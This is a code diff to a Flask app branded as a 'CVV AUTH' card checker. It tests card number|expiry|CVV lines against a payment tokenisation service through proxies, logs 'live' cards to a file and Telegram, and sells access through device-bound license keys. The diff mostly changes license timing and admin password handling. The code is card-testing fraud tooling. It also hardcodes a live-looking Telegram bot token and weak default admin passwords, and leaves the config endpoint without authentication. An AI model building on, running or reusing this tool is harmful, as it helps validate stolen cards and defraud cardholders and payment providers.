@@ -28,17 +28,24 @@ app = Flask(__name__)
 DB_FILE = 'keys.json'
 CONFIG_FILE = 'config.json'
 LIVE_FILE = 'live.txt'
-ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD", "errol1028")
+
+# Palitan ang "admin123" dito o gamitin ang Change Password sa Admin Panel
+DEFAULT_ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD", "admin123")
 
 DEFAULT_TG_TOKEN = "9138065167:AAHG3HmeQ8a_v7jiuUVqECR-m2W7Xc14fqg"
 DEFAULT_TG_CHAT = "6516330870"
 
+# Idle threshold in seconds bago mag-auto-pause ang key kapag walang heartbeat
+IDLE_PAUSE_THRESHOLD = 20
+
 checker_queue = queue.Queue()
 checker_stop_event = threading.Event()
+db_lock = threading.Lock()
 
 def load_config():
     if not os.path.exists(CONFIG_FILE):
         return {
+            "admin_password": DEFAULT_ADMIN_PASSWORD,
             "key_tg_token": DEFAULT_TG_TOKEN,
             "key_tg_chat": DEFAULT_TG_CHAT,
             "live_tg_token": "",
@@ -46,9 +53,18 @@ def load_config():
         }
     try:
         with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
-            return json.load(f)
+            cfg = json.load(f)
+            if "admin_password" not in cfg:
+                cfg["admin_password"] = DEFAULT_ADMIN_PASSWORD
+            return cfg
     except Exception:
-        return {"key_tg_token": DEFAULT_TG_TOKEN, "key_tg_chat": DEFAULT_TG_CHAT, "live_tg_token": "", "live_tg_chat": ""}
+        return {
+            "admin_password": DEFAULT_ADMIN_PASSWORD,
+            "key_tg_token": DEFAULT_TG_TOKEN,
+            "key_tg_chat": DEFAULT_TG_CHAT,
+            "live_tg_token": "",
+            "live_tg_chat": ""
+        }
 
 def save_config(cfg):
     with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
@@ -82,6 +98,96 @@ def save_db(data):
     with open(DB_FILE, 'w', encoding='utf-8') as f:
         json.dump(data, f, indent=4)
 
+def calculate_duration_seconds(amount, unit):
+    if not amount or unit == 'lifetime':
+        return None
+    try:
+        val = int(amount)
+        if unit == 'minutes':
+            return val * 60
+        elif unit == 'hours':
+            return val * 3600
+        elif unit == 'days':
+            return val * 86400
+        elif unit == 'months':
+            return val * 30 * 86400
+        elif unit == 'years':
+            return val * 365 * 86400
+        return None
+    except Exception:
+        return None
+
+def sync_key_usage(key_info, now_ts, active_ping=False, force_pause=False):
+    """
+    Nagka-calculate ng remaining_seconds base sa active usage.
+    - Kung hindi pa redeemed (`redeemed == False`), hindi gagalaw ang `remaining_seconds`.
+    - Kung redeemed at may recent ping within IDLE_PAUSE_THRESHOLD, ibabawas ang elapsed seconds.
+    - Kapag lumampas sa IDLE_PAUSE_THRESHOLD nang walang ping, auto-paused ang oras.
+    """
+    # Legacy migration kung dating expires_ts ang nakasave sa keys.json
+    if "remaining_seconds" not in key_info:
+        exp_ts = key_info.get("expires_ts")
+        if exp_ts is None:
+            key_info["remaining_seconds"] = None
+        else:
+            rem = max(0, int(exp_ts - now_ts))
+            key_info["remaining_seconds"] = rem
+        key_info["redeemed"] = bool(key_info.get("device_id"))
+        key_info["is_paused"] = True
+        key_info["last_active_ts"] = None
+
+    rem_sec = key_info.get("remaining_seconds")
+    if rem_sec is None:
+        # Lifetime key
+        if active_ping:
+            key_info["redeemed"] = True
+            key_info["is_paused"] = False
+            key_info["last_active_ts"] = now_ts
+        elif force_pause:
+            key_info["is_paused"] = True
+            key_info["last_active_ts"] = None
+        else:
+            last_ts = key_info.get("last_active_ts")
+            if not last_ts or (now_ts - last_ts) > IDLE_PAUSE_THRESHOLD:
+                key_info["is_paused"] = True
+        return key_info
+
+    # Kung hindi pa na-reredeem at hindi ito active ping mula sa checker
+    if not key_info.get("redeemed", False) and not active_ping:
+        key_info["is_paused"] = True
+        key_info["last_active_ts"] = None
+        return key_info
+
+    last_ts = key_info.get("last_active_ts")
+
+    if last_ts is not None and not key_info.get("is_paused", True):
+        delta = now_ts - last_ts
+        if 0 < delta <= IDLE_PAUSE_THRESHOLD:
+            rem_sec = max(0, rem_sec - delta)
+            key_info["remaining_seconds"] = rem_sec
+            key_info["last_active_ts"] = now_ts
+        elif delta > IDLE_PAUSE_THRESHOLD:
+            # Lumampas sa threshold dahil sinara ang tab o nawalan ng net -> Auto-pause
+            key_info["is_paused"] = True
+            key_info["last_active_ts"] = None
+
+    if rem_sec <= 0:
+        key_info["remaining_seconds"] = 0
+        key_info["status"] = "expired"
+        key_info["is_paused"] = True
+        key_info["last_active_ts"] = None
+        return key_info
+
+    if force_pause:
+        key_info["is_paused"] = True
+        key_info["last_active_ts"] = None
+    elif active_ping:
+        key_info["redeemed"] = True
+        key_info["is_paused"] = False
+        key_info["last_active_ts"] = now_ts
+
+    return key_info
+
 def save_live_card(card_line, detail, bin_info=None):
     try:
         with open(LIVE_FILE, "a", encoding="utf-8") as f:
@@ -92,10 +198,8 @@ def save_live_card(card_line, detail, bin_info=None):
         live_chat = cfg.get("live_tg_chat", "").strip()
         if live_token and live_chat:
             parts = card_line.split("|")
-            cc = parts[0].strip() if len(parts) > 0 else ""
             mo = parts[1].strip() if len(parts) > 1 else ""
             yr = parts[2].strip() if len(parts) > 2 else ""
-            cvv = parts[3].strip() if len(parts) > 3 else ""
             date_str = f"{mo}/{yr}"
 
             scheme = bin_info.get("scheme", "VISA/MC") if bin_info else "VISA/MC"
@@ -117,28 +221,6 @@ def save_live_card(card_line, detail, bin_info=None):
     except Exception:
         pass
 
-def calculate_expiration_utc(amount, unit):
-    if not amount or unit == 'lifetime':
-        return None
-    try:
-        val = int(amount)
-        now = datetime.now(timezone.utc)
-        if unit == 'minutes':
-            exp = now + timedelta(minutes=val)
-        elif unit == 'hours':
-            exp = now + timedelta(hours=val)
-        elif unit == 'days':
-            exp = now + timedelta(days=val)
-        elif unit == 'months':
-            exp = now + timedelta(days=val * 30)
-        elif unit == 'years':
-            exp = now + timedelta(days=val * 365)
-        else:
-            return None
-        return int(exp.timestamp())
-    except Exception:
-        return None
-
 @app.route('/')
 def home():
     return render_template('admin.html')
@@ -150,14 +232,39 @@ def checker_page():
 @app.route('/api/login', methods=['POST'])
 def api_login():
     data = request.get_json() or {}
-    if data.get('password') == ADMIN_PASSWORD:
+    cfg = load_config()
+    current_admin_pw = cfg.get("admin_password", DEFAULT_ADMIN_PASSWORD)
+    if data.get('password') == current_admin_pw:
         return jsonify({"success": True})
     return jsonify({"success": False, "message": "Incorrect password!"})
+
+@app.route('/api/admin/password', methods=['POST'])
+def change_admin_password():
+    data = request.get_json() or {}
+    current_pw = data.get('current_password', '')
+    new_pw = data.get('new_password', '').strip()
+
+    cfg = load_config()
+    saved_pw = cfg.get("admin_password", DEFAULT_ADMIN_PASSWORD)
+
+    if current_pw != saved_pw:
+        return jsonify({"success": False, "message": "Current password is incorrect!"}), 403
+    if len(new_pw) < 4:
+        return jsonify({"success": False, "message": "New password must be at least 4 characters."}), 400
+
+    cfg["admin_password"] = new_pw
+    save_config(cfg)
+    return jsonify({"success": True, "message": "Admin password updated successfully!"})
 
 @app.route('/api/config', methods=['GET', 'POST'])
 def handle_config():
     if request.method == 'GET':
-        return jsonify({"success": True, "config": load_config()})
+        cfg = load_config()
+        safe_cfg = {
+            "live_tg_token": cfg.get("live_tg_token", ""),
+            "live_tg_chat": cfg.get("live_tg_chat", "")
+        }
+        return jsonify({"success": True, "config": safe_cfg})
     elif request.method == 'POST':
         data = request.get_json() or {}
         cfg = load_config()
@@ -169,8 +276,6 @@ def handle_config():
 @app.route('/api/bin/<bin_code>')
 def api_bin_lookup(bin_code):
     bin_code = bin_code.strip()[:6]
-    
-    # Primary Source: bincheck.io
     try:
         r = requests.get(f"https://api.bincheck.io/v1/{bin_code}", timeout=5)
         if r.status_code == 200:
@@ -189,7 +294,6 @@ def api_bin_lookup(bin_code):
     except Exception:
         pass
 
-    # Secondary Source: binlist.net
     try:
         r2 = requests.get(f"https://lookup.binlist.net/{bin_code}", headers={'Accept-Version': '3'}, timeout=5)
         if r2.status_code == 200:
@@ -211,148 +315,177 @@ def api_bin_lookup(bin_code):
 
 @app.route('/api/keys', methods=['GET', 'POST'])
 def handle_keys():
-    keys_data = load_db()
-
-    if request.method == 'GET':
-        result = []
+    with db_lock:
+        keys_data = load_db()
         now_ts = int(datetime.now(timezone.utc).timestamp())
-        updated = False
 
-        for key, info in keys_data.items():
-            expires_ts = info.get('expires_ts')
-            status = info.get('status', 'active')
+        if request.method == 'GET':
+            result = []
+            for key, info in keys_data.items():
+                sync_key_usage(info, now_ts, active_ping=False)
+                rem_sec = info.get('remaining_seconds')
+                redeemed = info.get('redeemed', False)
+                is_paused = info.get('is_paused', True)
+                status = info.get('status', 'active')
 
-            if expires_ts and status == 'active':
-                if now_ts > expires_ts:
-                    status = 'expired'
-                    keys_data[key]['status'] = 'expired'
-                    updated = True
+                result.append({
+                    "key": key,
+                    "remaining_seconds": rem_sec,
+                    "redeemed": redeemed,
+                    "is_paused": is_paused,
+                    "status": status,
+                    "device_id": info.get('device_id', '')
+                })
 
-            result.append({
-                "key": key,
-                "expires_ts": expires_ts,
-                "status": status,
-                "device_id": info.get('device_id', '')
-            })
-
-        if updated:
             save_db(keys_data)
+            return jsonify({"success": True, "keys": result})
 
-        return jsonify({"success": True, "keys": result})
+        elif request.method == 'POST':
+            data = request.get_json() or {}
+            custom_key = str(data.get('key', '')).strip()
+            duration_val = data.get('duration_val', '1')
+            duration_unit = data.get('duration_unit', 'lifetime')
+            quantity = min(max(int(data.get('quantity', 1)), 1), 100)
+            notify_tg = data.get('notify_tg', True)
 
-    elif request.method == 'POST':
-        data = request.get_json() or {}
-        custom_key = str(data.get('key', '')).strip()
-        duration_val = data.get('duration_val', '1')
-        duration_unit = data.get('duration_unit', 'lifetime')
-        quantity = min(max(int(data.get('quantity', 1)), 1), 100)
-        notify_tg = data.get('notify_tg', True)
+            dur_seconds = calculate_duration_seconds(duration_val, duration_unit)
+            created_keys = []
 
-        exp_ts = calculate_expiration_utc(duration_val, duration_unit)
-        created_keys = []
-
-        if custom_key and quantity == 1:
-            if custom_key in keys_data:
-                return jsonify({"success": False, "message": "Key already exists!"})
-            keys_data[custom_key] = {
-                "expires_ts": exp_ts,
-                "status": "active",
-                "device_id": ""
-            }
-            created_keys.append(custom_key)
-        else:
-            prefix = custom_key if custom_key else "KYU"
-            for _ in range(quantity):
-                while True:
-                    part1 = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
-                    part2 = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
-                    new_key = f"{prefix}-{part1}-{part2}"
-                    if new_key not in keys_data:
-                        break
-                keys_data[new_key] = {
-                    "expires_ts": exp_ts,
+            if custom_key and quantity == 1:
+                if custom_key in keys_data:
+                    return jsonify({"success": False, "message": "Key already exists!"})
+                keys_data[custom_key] = {
+                    "remaining_seconds": dur_seconds,
+                    "redeemed": False,
+                    "is_paused": True,
+                    "last_active_ts": None,
                     "status": "active",
                     "device_id": ""
                 }
-                created_keys.append(new_key)
+                created_keys.append(custom_key)
+            else:
+                prefix = custom_key if custom_key else "KYU"
+                for _ in range(quantity):
+                    while True:
+                        part1 = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
+                        part2 = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
+                        new_key = f"{prefix}-{part1}-{part2}"
+                        if new_key not in keys_data:
+                            break
+                    keys_data[new_key] = {
+                        "remaining_seconds": dur_seconds,
+                        "redeemed": False,
+                        "is_paused": True,
+                        "last_active_ts": None,
+                        "status": "active",
+                        "device_id": ""
+                    }
+                    created_keys.append(new_key)
 
-        save_db(keys_data)
+            save_db(keys_data)
 
-        if notify_tg and created_keys:
-            cfg = load_config()
-            token = cfg.get("key_tg_token", DEFAULT_TG_TOKEN)
-            chat_id = cfg.get("key_tg_chat", DEFAULT_TG_CHAT)
-            exp_label = f"{duration_val} {duration_unit.capitalize()}" if exp_ts else "Lifetime"
-            keys_formatted = "\n".join([f"<code>{k}</code>" for k in created_keys])
-            tg_msg = (
-                f"<b>⚡ KYU CVV AUTH - LICENSE GENERATOR ⚡</b>\n\n"
-                f"📦 <b>Generated:</b> <code>{len(created_keys)} key(s)</code>\n"
-                f"⏳ <b>Duration:</b> <code>{exp_label}</code>\n\n"
-                f"{keys_formatted}"
-            )
-            send_telegram_alert(token, chat_id, tg_msg)
+            if notify_tg and created_keys:
+                cfg = load_config()
+                token = cfg.get("key_tg_token", DEFAULT_TG_TOKEN)
+                chat_id = cfg.get("key_tg_chat", DEFAULT_TG_CHAT)
+                exp_label = f"{duration_val} {duration_unit.capitalize()}" if dur_seconds else "Lifetime"
+                keys_formatted = "\n".join([f"<code>{k}</code>" for k in created_keys])
+                tg_msg = (
+                    f"<b>⚡ KYU CVV AUTH - LICENSE GENERATOR ⚡</b>\n\n"
+                    f"📦 <b>Generated:</b> <code>{len(created_keys)} key(s)</code>\n"
+                    f"⏳ <b>Duration:</b> <code>{exp_label} (Starts on Redeem)</code>\n\n"
+                    f"{keys_formatted}"
+                )
+                send_telegram_alert(token, chat_id, tg_msg)
 
-        return jsonify({"success": True, "keys": created_keys})
+            return jsonify({"success": True, "keys": created_keys})
 
 @app.route('/api/keys/<path:key_id>', methods=['PUT', 'DELETE'])
 def modify_key(key_id):
-    keys_data = load_db()
-    if key_id not in keys_data:
-        return jsonify({"success": False, "message": "Key not found"}), 404
+    with db_lock:
+        keys_data = load_db()
+        if key_id not in keys_data:
+            return jsonify({"success": False, "message": "Key not found"}), 404
 
-    if request.method == 'DELETE':
-        del keys_data[key_id]
-        save_db(keys_data)
-        return jsonify({"success": True, "message": "Deleted"})
-    elif request.method == 'PUT':
-        data = request.get_json() or {}
-        if data.get('action') == 'reset_hwid':
-            keys_data[key_id]['device_id'] = ""
-        else:
-            keys_data[key_id]['expires_ts'] = calculate_expiration_utc(data.get('duration_val', '1'), data.get('duration_unit', 'lifetime'))
-            keys_data[key_id]['status'] = 'active'
-        save_db(keys_data)
-        return jsonify({"success": True, "message": "Updated"})
+        now_ts = int(datetime.now(timezone.utc).timestamp())
+
+        if request.method == 'DELETE':
+            del keys_data[key_id]
+            save_db(keys_data)
+            return jsonify({"success": True, "message": "Deleted"})
+        elif request.method == 'PUT':
+            data = request.get_json() or {}
+            action = data.get('action')
+            if action == 'reset_hwid':
+                keys_data[key_id]['device_id'] = ""
+            elif action == 'toggle_pause':
+                sync_key_usage(keys_data[key_id], now_ts, active_ping=False, force_pause=True)
+            else:
+                new_seconds = calculate_duration_seconds(data.get('duration_val', '1'), data.get('duration_unit', 'lifetime'))
+                keys_data[key_id]['remaining_seconds'] = new_seconds
+                keys_data[key_id]['status'] = 'active'
+                if not keys_data[key_id].get('redeemed', False):
+                    keys_data[key_id]['is_paused'] = True
+                    keys_data[key_id]['last_active_ts'] = None
+                else:
+                    keys_data[key_id]['last_active_ts'] = now_ts
+            save_db(keys_data)
+            return jsonify({"success": True, "message": "Updated"})
 
 @app.route('/verify.php', methods=['POST'])
 def verify_key():
     data = request.get_json() or {}
     incoming_key = str(data.get('key', '')).strip().upper()
     device_id = str(data.get('device_id', '')).strip()
+    action = str(data.get('action', 'ping')).strip().lower()
 
     if not incoming_key:
         return jsonify({"success": False, "message": "Please enter a license key."})
     
-    keys_data = load_db()
-    matched_key = None
-    for k in keys_data.keys():
-        if k.strip().upper() == incoming_key:
-            matched_key = k
-            break
+    with db_lock:
+        keys_data = load_db()
+        matched_key = None
+        for k in keys_data.keys():
+            if k.strip().upper() == incoming_key:
+                matched_key = k
+                break
 
-    if not matched_key:
-        return jsonify({"success": False, "message": "Invalid license key."})
+        if not matched_key:
+            return jsonify({"success": False, "message": "Invalid license key."})
 
-    key_info = keys_data[matched_key]
-    if key_info.get('status') != 'active':
-        return jsonify({"success": False, "message": "Key is inactive or expired."})
-
-    expires_ts = key_info.get('expires_ts')
-    if expires_ts:
+        key_info = keys_data[matched_key]
         now_ts = int(datetime.now(timezone.utc).timestamp())
-        if now_ts > expires_ts:
-            key_info['status'] = 'expired'
+
+        if action == 'pause':
+            sync_key_usage(key_info, now_ts, active_ping=False, force_pause=True)
+            save_db(keys_data)
+            return jsonify({
+                "success": True,
+                "paused": True,
+                "remaining_seconds": key_info.get("remaining_seconds")
+            })
+
+        stored_device = key_info.get('device_id', '')
+        if stored_device and stored_device != device_id:
+            return jsonify({"success": False, "message": "HWID mismatch (Bound to another device)."})
+
+        if not stored_device:
+            key_info['device_id'] = device_id
+
+        sync_key_usage(key_info, now_ts, active_ping=True, force_pause=False)
+
+        if key_info.get('status') != 'active':
             save_db(keys_data)
             return jsonify({"success": False, "message": "License key has expired."})
 
-    stored_device = key_info.get('device_id', '')
-    if not stored_device:
-        key_info['device_id'] = device_id
         save_db(keys_data)
-    elif stored_device != device_id:
-        return jsonify({"success": False, "message": "HWID mismatch (Bound to another device)."})
-
-    return jsonify({"success": True, "expires_ts": expires_ts})
+        return jsonify({
+            "success": True,
+            "key": matched_key,
+            "remaining_seconds": key_info.get('remaining_seconds'),
+            "redeemed": key_info.get('redeemed', True),
+            "is_paused": key_info.get('is_paused', False)
+        })
 
 TOKENISATION_BASE = "https://web.uk.littlepay.com"
 PARTICIPANT_ID = "coast-rta"
@@ -599,7 +732,6 @@ def background_worker(cards, proxies_list, max_threads):
             counts["checked"] += 1
             if code == 0:
                 counts["live"] += 1
-                # Quick server-side BIN lookup for Telegram alert formatting
                 bin_code = card.split("|")[0].strip()[:6]
                 bin_meta = {}
                 try:
@@ -642,7 +774,7 @@ def api_checker_start():
     checker_stop_event.set()
     while not checker_queue.empty():
         try: checker_queue.get_nowait()
-        except: pass
+        except Exception: pass
 
     checker_stop_event = threading.Event()
     data = request.get_json() or {}
